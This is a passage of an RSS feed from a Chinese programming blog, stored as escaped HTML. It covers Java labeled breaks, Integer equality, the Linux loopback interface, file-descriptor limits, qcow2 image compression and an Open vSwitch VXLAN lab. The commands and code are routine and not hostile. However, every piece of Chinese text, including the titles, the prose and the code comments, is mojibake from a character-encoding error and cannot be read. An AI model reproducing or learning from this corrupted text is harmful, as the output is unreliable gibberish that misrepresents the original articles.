&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// è¾“å‡º&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hello
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;test:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt; test; &lt;span style=&#34;color:#75715e&#34;&gt;// works&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;world&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// è¾“å‡º&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hello
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;test:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt; test; &lt;span style=&#34;color:#75715e&#34;&gt;// works&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;world&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// è¾“å‡º&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hello
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;integerçš„æ˜¯å¦ç›¸ç­‰é—®é¢˜&#34;&gt;Integerçš„æ˜¯å¦ç›¸ç­‰é—®é¢˜&lt;/h3&gt;
&lt;p&gt;æ—¥å¸¸å¼€å‘ä½¿ç”¨åˆ°JavaåŸºæœ¬æ•°æ®ç±»å‹æ˜¯ä¸å¯é¿å…çš„ä¸€ä»¶äº‹ï¼Œä½†å®ƒå´åŒ…å«äº†ä¸€äº›å¾ˆå®¹æ˜“çŠ¯é”™çš„ç‚¹ï¼Œè¸©è¿‡ä¸€äº›å‘çš„åŒå­¦å¯èƒ½äº†è§£JavaåŸºæœ¬åŒ…è£…ç±»å‹çš„å¸¸é‡æ± æŠ€æœ¯ï¼Œä¾‹å¦‚&lt;code&gt;Integer&lt;/code&gt;å°±å…·æœ‰æ•°å€¼&lt;code&gt;[-128ï¼Œ127] &lt;/code&gt;çš„ç›¸åº”ç±»å‹çš„ç¼“å­˜æ•°æ®ï¼Œä½†ä¸‹é¢å®šä¹‰çš„4ä¸ªå˜é‡æ˜¯å¦ç›¸ç­‰ä½ æ˜¯å¦èƒ½è¯´çš„å‡ºæ¥å‘¢ï¼Ÿ&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux ç¯å›ç½‘ç»œæ¥å£</title>
      <link>https://www.typesafe.cn/posts/linux-loopback/</link>
      <pubDate>Thu, 28 Jan 2021 22:59:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/linux-loopback/</guid>
      <description>&lt;p&gt;åœ¨å¼€å‘æˆ–è€…è°ƒè¯•æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å’Œæœ¬åœ°çš„æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œä¾‹å¦‚å¯åŠ¨&lt;code&gt;nginx&lt;/code&gt;ä¹‹åï¼Œåœ¨æµè§ˆå™¨è¾“å…¥&lt;code&gt;lcoalhost&lt;/code&gt;æˆ–è€…&lt;code&gt;127.0.0.1&lt;/code&gt;å°±å¯ä»¥è®¿é—®åˆ°æœ¬æœºä¸Šé¢çš„&lt;code&gt;http&lt;/code&gt;æœåŠ¡ã€‚&lt;/p&gt;
&lt;h2 id=&#34;linuxæ˜¯å¦‚ä½•è®¿é—®æœ¬æœºipçš„&#34;&gt;Linuxæ˜¯å¦‚ä½•è®¿é—®æœ¬æœºIPçš„ï¼Ÿ&lt;/h2&gt;
&lt;p&gt;å¤§å¤šæ•°æ“ä½œç³»ç»Ÿéƒ½åœ¨ç½‘ç»œå±‚å®ç°äº†ç¯å›èƒ½åŠ›ï¼Œé€šå¸¸æ˜¯ä½¿ç”¨ä¸€ä¸ªè™šæ‹Ÿçš„ç¯å›ç½‘ç»œæ¥å£æ¥å®ç°ã€‚è¿™ä¸ªè™šæ‹Ÿçš„ç¯å›ç½‘ç»œæ¥å£çœ‹ç€åƒæ˜¯ä¸€ä¸ªçœŸå®çš„ç½‘å¡ï¼Œå®é™…ä¸Šæ˜¯æ“ä½œç³»ç»Ÿç”¨è½¯ä»¶æ¨¡æ‹Ÿçš„ï¼Œå®ƒå¯ä»¥é€šè¿‡&lt;code&gt;TCP/IP&lt;/code&gt;ä¸åŒä¸€å°ä¸»æœºä¸Šçš„å…¶ä»–æœåŠ¡è¿›è¡Œé€šä¿¡ï¼Œä»¥&lt;code&gt;127&lt;/code&gt;å¼€å¤´çš„&lt;code&gt;IPv4&lt;/code&gt;åœ°å€å°±æ˜¯ä¸ºå®ƒä¿ç•™çš„ï¼Œä¸»æµ&lt;code&gt;Linux&lt;/code&gt;æ“ä½œç³»ç»Ÿä¸ºç¯å›ç½‘å¡åˆ†é…çš„åœ°å€éƒ½æ˜¯&lt;code&gt;127.0.0.1&lt;/code&gt;ï¼Œä¸»æœºåæ˜¯&lt;code&gt;localhost&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ç¯å›ç½‘ç»œæ¥å£ä¹‹æ‰€ä»¥è¢«ç§°ä¹‹ä¸ºç¯å›ç½‘ç»œæ¥å£ï¼Œæ˜¯å› ä¸ºä»æœ¬æœºå‘é€åˆ°æœ¬æœºä»»æ„ä¸€ä¸ªIPçš„æ•°æ®æŠ¥æ–‡éƒ½ä¼šåœ¨ç½‘ç»œå±‚äº¤ç»™ç¯å›ç½‘ç»œæ¥å£ï¼Œä¸å†ä¸‹å‘åˆ°æ•°æ®é“¾è·¯å±‚è¿›è¡Œå¤„ç†ï¼Œç¯å›ç½‘ç»œæ¥å£ç›´æ¥å‘é€å›ç½‘ç»œå±‚ï¼Œæœ€ç»ˆäº¤ç”±åº”ç”¨å±‚è½¯ä»¶ç¨‹åºè¿›è¡Œå¤„ç†ã€‚è¿™ç§æ–¹å¼å¯¹äºæ€§èƒ½æµ‹è¯•éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºçœå»äº†ç¡¬ä»¶çš„å¼€é”€ï¼Œå¯ä»¥ç›´æ¥æµ‹è¯•åè®®æ ˆè½¯ä»¶æ‰€éœ€è¦çš„æ—¶é—´ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ç¯å›ç½‘ç»œæ¥å£æ˜¯å¦‚ä½•åˆ¤æ–­ç›®çš„IPæ˜¯å¦ä¸ºæœ¬æœºåœ°å€çš„å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ç­”æ¡ˆå°±æ˜¯ç½‘ç»œå±‚åœ¨è¿›è¡Œè·¯ç”±è½¬å‘çš„æ—¶å€™ä¼šå…ˆæŸ¥æœ¬åœ°çš„è·¯ç”±è¡¨ï¼Œå‘ç°æ˜¯æœ¬æœºIPåäº¤ç»™ç¯å›ç½‘ç»œæ¥å£ã€‚æŸ¥çœ‹æœ¬åœ°è·¯ç”±è¡¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip route show table local
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;broadcast 10.141.128.0 dev eth0 proto kernel scope link src 10.141.155.131 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;local 10.141.155.131 dev eth0 proto kernel scope host src 10.141.155.131 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;broadcast 10.141.191.255 dev eth0 proto kernel scope link src 10.141.155.131 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…¶ä¸­&lt;code&gt;local&lt;/code&gt;å¼€å¤´çš„ä¾¿æ˜¯æœ¬åœ°IPï¼Œ&lt;code&gt;dev&lt;/code&gt;åé¢æ˜¯ç½‘å¡åç§°ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux ä¿®æ”¹æœ€å¤§æ–‡ä»¶æè¿°ç¬¦</title>
      <link>https://www.typesafe.cn/posts/linux-limit/</link>
      <pubDate>Mon, 11 Jan 2021 15:40:41 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/linux-limit/</guid>
      <description>&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;#34;fs.file-max=655350&amp;#34; &amp;gt;&amp;gt;/etc/sysctl.conf
echo &amp;#34;* soft nofile 655350&amp;#34;  &amp;gt;&amp;gt; /etc/security/limits.conf
echo &amp;#34;* hard nofile 655350&amp;#34;  &amp;gt;&amp;gt; /etc/security/limits.conf
ulimit -n 655350
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>å‹ç¼©qcow2 é•œåƒæ–‡ä»¶</title>
      <link>https://www.typesafe.cn/posts/qcow2-image-compression/</link>
      <pubDate>Thu, 31 Dec 2020 00:00:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/qcow2-image-compression/</guid>
      <description>&lt;h1 id=&#34;å‹ç¼©qcow2&#34;&gt;å‹ç¼©qcow2&lt;/h1&gt;
&lt;p&gt;é¦–å…ˆï¼Œéœ€è¦å¯¹è™šæ‹Ÿæœºå‰©ä½™ç©ºé—´è¿›è¡Œå†™é›¶æ“ä½œï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dd if=/dev/zero of=/zero.dat
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åˆ é™¤ zero.datï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rm /zero.dat
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å…³é—­è™šæ‹Ÿæœºï¼Œæ‰§è¡Œ&lt;code&gt;qemu-img&lt;/code&gt;çš„&lt;code&gt;convert&lt;/code&gt;å‘½ä»¤è¿›è¡Œè½¬æ¢ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;qemu-img convert -c -O qcow2 /path/old.img.qcow2 /path/new.img.qcow2
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Open vSwitch å…¥é—¨å®è·µï¼ˆ6ï¼‰VXLANå®éªŒ</title>
      <link>https://www.typesafe.cn/posts/ovs-learn-6/</link>
      <pubDate>Wed, 30 Dec 2020 19:14:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/ovs-learn-6/</guid>
      <description>&lt;h1 id=&#34;ä»€ä¹ˆæ˜¯vxlan&#34;&gt;ä»€ä¹ˆæ˜¯VXLANï¼Ÿ&lt;/h1&gt;
&lt;p&gt;VXLANæ˜¯ä¸€ç§éš§é“å°è£…åè®®ï¼Œåœ¨ä¸‰å±‚ç½‘ç»œä¸Šå°è£…äºŒå±‚ç½‘ç»œæ•°æ®æŠ¥æ–‡ã€‚ç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥åœ¨å·²ç»è§„åˆ’å¥½ç½‘ç»œæ‹“æ‰‘çš„è®¾å¤‡ä¸Šå°è£…å‡ºä¸€ä¸ªæ–°çš„äºŒå±‚ç½‘ç»œï¼Œå› æ­¤VXLANè¿™ç±»ç½‘ç»œåˆè¢«ç§°ä¹‹ä¸ºoverylayç½‘ç»œï¼Œåº•ä¸‹æ‰¿è½½VXLANç½‘ç»œçš„å°±è¢«ç§°ä¹‹ä¸ºunderlayç½‘ç»œã€‚&lt;/p&gt;
&lt;h1 id=&#34;vxlanè§£å†³äº†ä»€ä¹ˆé—®é¢˜&#34;&gt;VXLANè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ&lt;/h1&gt;
&lt;p&gt;æœ€è¿‘å‡ å¹´ï¼Œé˜¿é‡Œäº‘ï¼Œè…¾è®¯äº‘ï¼Œäº¬ä¸œäº‘ï¼Œåä¸ºäº‘ç­‰ç­‰å‚å•†æ¯åˆ°èŠ‚æ—¥éƒ½ä¼šæ‰“æŠ˜å‡ºå”®å¤§é‡äº‘æœåŠ¡å™¨ï¼Œ1æ ¸1Gå†…å­˜50Gç£ç›˜çš„æœåŠ¡å™¨å‡ åå—å°±èƒ½ä¹°åˆ°ä¸€å¹´çš„ä½¿ç”¨æƒï¼Œä½œä¸ºä¸€ä¸ªä¸“ä¸šçš„ç¾Šæ¯›å…šï¼Œå“ªä¸ªæ‰‹é‡Œæ²¡æœ‰å‡ å°å°ç ´æ°´ç®¡æœºå™¨ï¼Ÿä½†æ˜¯è¿™ä¹ˆå¤šçš„äº‘æœåŠ¡å™¨æ˜¯å‚å•†å¦‚ä½•åšéš”ç¦»çš„å‘¢ï¼Ÿäº†è§£è¿‡ç½‘ç»œçš„åŒå­¦æˆ–è®¸ä¼šè¯´VLANã€‚ä½†æ˜¯VLANè¿™ç§åªèƒ½éš”ç¦»4094ä¸ªè™šæ‹Ÿç½‘ç»œçš„æŠ€æœ¯åˆ«è¯´æ»¡è¶³ä¸äº†ç¾Šæ¯›å…šäº†ï¼Œå°±è¿æ­£å¸¸çš„ç”¨æˆ·ä¼°è®¡éƒ½æ’‘ä¸ä½ã€‚é‚£ä¸éš”ç¦»èƒ½è¡Œå—ï¼Œå‚å•†è§„åˆ’ä¸€ä¸ªç‰¹åˆ«å¤§çš„ç½‘æ®µï¼Œè®©å¤§å®¶éƒ½åœ¨è¿™é‡Œé¢è€ï¼Œæ­£å¸¸ç”¨æˆ·è¿˜å¥½ï¼Œä¸‡ä¸€è¿™ä¸ªæ—¶å€™è¿›æ¥ä¸€ä¸ªå¤§é»‘å®¢ï¼Œä¼°è®¡å°±ä¼šå…¨éƒ¨GGã€‚&lt;/p&gt;
&lt;p&gt;å› æ­¤ï¼Œéš”ç¦»æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå…¶ä¸­å…³é”®çš„æŠ€æœ¯å°±æ˜¯overlayç½‘ç»œã€‚&lt;/p&gt;
&lt;p&gt;é‚£VXLANå…·ä½“è§£å†³äº†å“ªäº›é—®é¢˜å‘¢ï¼Ÿ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;çªç ´äº†VLANæŠ€æœ¯4094ä¸ªéš”ç¦»ç½‘ç»œçš„é™åˆ¶ï¼Œåœ¨ä¸€ä¸ªç®¡ç†åŸŸä¸­åˆ›å»ºå¤šè¾¾1600ä¸‡ä¸ªVXLANç½‘ç»œã€‚&lt;/li&gt;
&lt;li&gt;VXLANæä¾›äº†äº‘æœåŠ¡å‚å•†æ‰€éœ€çš„è§„æ¨¡çš„ç½‘ç»œåˆ†æ®µï¼Œä»¥æ”¯æŒå¤§é‡ç§Ÿæˆ·ã€‚&lt;/li&gt;
&lt;li&gt;çªç ´äº†ç‰©ç†ç½‘ç»œè¾¹ç•Œçš„é™åˆ¶ï¼Œä¼ ç»Ÿè™šæ‹ŸäºŒå±‚ç½‘ç»œï¼ˆVLANï¼‰æ˜¯éœ€è¦å’Œç‰©ç†ç½‘ç»œåšå¤§é‡é€‚é…å·¥ä½œæ‰èƒ½ä¿è¯ç¯å¢ƒçš„è¿ç§»ä¸ä¼šå¯¼è‡´è™šæ‹Ÿç½‘ç»œå¼‚å¸¸ï¼Œoverlayç½‘ç»œåˆ™ä¸å¿…å…³å¿ƒåº•å±‚ç‰©ç†ç½‘ç»œæ˜¯å¦‚ä½•æ­å»ºçš„ï¼Œåªè¦èƒ½ä¿è¯VXLANç«¯ç‚¹ç›¸äº’ä¹‹é—´å¯ä»¥è”é€šå³å¯ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;vxlanç½‘ç»œå¦‚ä½•å·¥ä½œ&#34;&gt;VXLANç½‘ç»œå¦‚ä½•å·¥ä½œï¼Ÿ&lt;/h1&gt;
&lt;p&gt;VXLANéš§é“åè®®å°†äºŒå±‚ä»¥å¤ªç½‘å¸§å°è£…åœ¨ä¸‰å±‚UDPæ•°æ®åŒ…ä¸­ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿåˆ›å»ºè·¨ç‰©ç†ä¸‰å±‚ç½‘ç»œçš„è™šæ‹ŸåŒ–äºŒå±‚å­ç½‘æˆ–ç½‘æ®µã€‚æ¯ä¸ªäºŒå±‚å­ç½‘ä½¿ç”¨VXLANç½‘ç»œæ ‡è¯†ç¬¦ï¼ˆVNIï¼‰ä½œä¸ºå”¯ä¸€æ ‡è¯†ã€‚æŠ¥æ–‡æ ¼å¼å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;VXLANæŠ¥æ–‡æ ¼å¼&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/vxlan_packet_header.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰§è¡Œæ•°æ®åŒ…å°è£…å’Œè§£å°è£…çš„å®ä½“ç§°ä¸ºVXLANéš§é“ç»ˆç»“ç‚¹ï¼ˆVTEPï¼‰ã€‚VTEPä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼šç¡¬ä»¶VTEPå’Œè½¯ä»¶VTEPã€‚ç¡¬ä»¶VTEPæˆ‘æ¥è§¦è¾ƒå°‘ï¼Œè¿™é‡Œå°±ä¸å†ä»‹ç»äº†ã€‚&lt;/p&gt;
&lt;p&gt;è½¯ä»¶VTEPå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šVTEPåœ¨æ•°æ®åŒ…åˆ°è¾¾è™šæ‹Ÿæœºä¹‹å‰è¿›è¡Œäº†å°è£…å’Œè§£å°è£…ï¼Œä½¿å¾—è™šæ‹Ÿæœºå®Œå…¨ä¸éœ€è¦çŸ¥é“VXLANéš§é“ä»¥åŠå®ƒä»¬ä¹‹é—´çš„ä¸‰å±‚ç½‘ç»œã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;vxlanç½‘ç»œ&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/vxlan01.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;ç®€å•vxlanå®éªŒ&#34;&gt;ç®€å•VXLANå®éªŒ&lt;/h1&gt;
&lt;p&gt;æˆ‘ä»¬å‚ç…§ä¸‹å›¾å®Œæˆå®éªŒã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;VXLANå®éªŒ&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/vxlan_topo.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ä¸»æœºa&#34;&gt;ä¸»æœºA&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# åˆ›å»ºéš§é“ç½‘æ¡¥
ovs-vsctl add-br br-tun
# åˆ›å»ºéš§é“ç«¯å£å¹¶æŒ‡å®šè¿œç«¯IPå’ŒVXLAN ID
ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.232 options:key=1111
# åˆ›å»ºå†…éƒ¨ç«¯å£
ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal
# åˆ›å»ºnetnsç”¨äºæ¨¡æ‹Ÿè™šæ‹Ÿç½‘ç»œè®¾å¤‡
ip netns add ns0
# å°†å†…éƒ¨ç«¯å£ç§»åŠ¨åˆ°netnsä¸­
ip link set vnet0 netns ns0
# å¯åŠ¨ç½‘å¡
ip netns exec ns0 ip link set lo up
ip netns exec ns0 ip link set vnet0 up
# é…ç½®IP
ip netns exec ns0 ip addr add 192.168.0.1/24 dev vnet0
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;ä¸»æœºb&#34;&gt;ä¸»æœºB&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# åˆ›å»ºéš§é“ç½‘æ¡¥
ovs-vsctl add-br br-tun
# åˆ›å»ºéš§é“ç«¯å£å¹¶æŒ‡å®šè¿œç«¯IPå’ŒVXLAN ID
ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.231 options:key=1111
# åˆ›å»ºå†…éƒ¨ç«¯å£
ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal
# åˆ›å»ºnetnsç”¨äºæ¨¡æ‹Ÿè™šæ‹Ÿç½‘ç»œè®¾å¤‡
ip netns add ns0
# å°†å†…éƒ¨ç«¯å£ç§»åŠ¨åˆ°netnsä¸­
ip link set vnet0 netns ns0
# å¯åŠ¨ç½‘å¡
ip netns exec ns0 ip link set lo up
ip netns exec ns0 ip link set vnet0 up
# é…ç½®IP
ip netns exec ns0 ip addr add 192.168.0.2/24 dev vnet0
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;æµ‹è¯•&#34;&gt;æµ‹è¯•&lt;/h2&gt;
&lt;p&gt;åœ¨&lt;code&gt;ä¸»æœºA&lt;/code&gt;ä¸Šæµ‹è¯•ç½‘ç»œè¿é€šæ€§ &lt;code&gt;ip netns exec ns0 ping 192.168.0.2&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Open vSwitch å…¥é—¨å®è·µï¼ˆ5ï¼‰OVS Flow Table æµè¡¨è§„åˆ™</title>
      <link>https://www.typesafe.cn/posts/ovs-learn-5/</link>
      <pubDate>Tue, 29 Dec 2020 18:38:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/ovs-learn-5/</guid>
      <description>&lt;h1 id=&#34;openvswitch-flow-table-æµè¡¨&#34;&gt;OpenvSwitch flow table æµè¡¨&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;OpenFlowï¼ˆOFï¼‰è¢«è®¤ä¸ºæ˜¯ç¬¬ä¸€ä¸ª&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E8%BB%9F%E4%BB%B6%E5%AE%9A%E7%BE%A9%E7%B6%B2%E7%B5%A1&#34;&gt;è½¯ä»¶å®šä¹‰ç½‘ç»œ&lt;/a&gt;ï¼ˆSDNï¼‰æ ‡å‡†ä¹‹ä¸€ã€‚å®ƒæœ€åˆåœ¨SDNç¯å¢ƒä¸­å®šä¹‰äº†é€šä¿¡åè®®ï¼Œä½¿SDNæ§åˆ¶å™¨èƒ½å¤Ÿä¸ç‰©ç†å’Œè™šæ‹Ÿçš„äº¤æ¢æœºå’Œè·¯ç”±å™¨ç­‰ç½‘ç»œè®¾å¤‡çš„è½¬å‘å¹³é¢ç›´æ¥è¿›è¡Œäº¤äº’ï¼Œä»è€Œæ›´å¥½åœ°é€‚åº”ä¸æ–­å˜åŒ–çš„ä¸šåŠ¡éœ€æ±‚ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å¦‚æœæŠŠOpenFlowæ§åˆ¶å™¨æ¯”ä½œâ€œå¤§è„‘â€ï¼ŒOVSæµè¡¨å°±åƒæ˜¯â€œå¤§è…¿â€ä¸€æ ·æ¥å—æ¥è‡ªâ€œå¤§è„‘â€çš„æŒ‡ä»¤ï¼Œå†³å®šè¦å‘å“ªä¸ªæ–¹å‘å‰è¿›ã€‚ä½†OVSæµè¡¨åŠŸèƒ½æ›´åŠ å¼ºå¤§ï¼Œåœ¨æ²¡æœ‰OpenFlowæ§åˆ¶å™¨æ—¶ï¼Œä¹Ÿå¯ä»¥è‡ªä¸»å·¥ä½œï¼Œå®ƒæœ¬èº«ä¹Ÿä¾›ä¸€äº›å‘½ä»¤è®©æˆ‘ä»¬å¯ä»¥ç›´æ¥ç®¡ç†æµè¡¨ã€‚&lt;/p&gt;
&lt;h1 id=&#34;æ“ä½œå‘½ä»¤&#34;&gt;æ“ä½œå‘½ä»¤&lt;/h1&gt;
&lt;h3 id=&#34;æŸ¥çœ‹æµè¡¨è§„åˆ™&#34;&gt;æŸ¥çœ‹æµè¡¨è§„åˆ™&lt;/h3&gt;
